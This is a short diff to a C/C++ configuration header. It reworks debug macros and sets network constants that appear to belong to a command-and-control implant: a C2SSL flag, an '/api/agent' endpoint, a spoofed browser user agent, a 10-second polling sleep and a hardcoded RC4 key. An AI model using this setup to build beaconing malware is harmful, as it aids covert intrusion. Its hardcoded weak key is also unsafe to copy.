@@ -11,14 +11,14 @@
 #endif
 
 // Debug output macros
-#if VERBOSE
-#define PRINTF(f_, ...) printf((f_), __VA_ARGS__)
-#define CERR(x) std::cerr << x
-#define COUT(x) std::cout << x
+#ifdef DEBUG
+    #define PRINTF(fmt, ...) printf(fmt, ##__VA_ARGS__)
+    #define CERR(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
+    #define VERBOSE 1
 #else
-#define PRINTF(f_, ...)
-#define CERR(x)
-#define COUT(x)
+    #define PRINTF(fmt, ...) ((void)0) 
+    #define CERR(fmt, ...) ((void)0)    
+    #define VERBOSE 0
 #endif
 
 // Security defines
@@ -31,11 +31,12 @@
 #endif
 
 // Network Configuration Constants
+#define RC4_KEY "Password1!Password1!"
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 9090
-#define API_ENDPOINT "/api/send"
+#define API_ENDPOINT "/api/agent"
 #define USERAGENT "Mozilla/5.0"
-#define C2SSL FALSE
+#define C2SSL 0
 
 // Timing Configuration Constants
 #define SLEEP_TIME 10      // seconds between polling
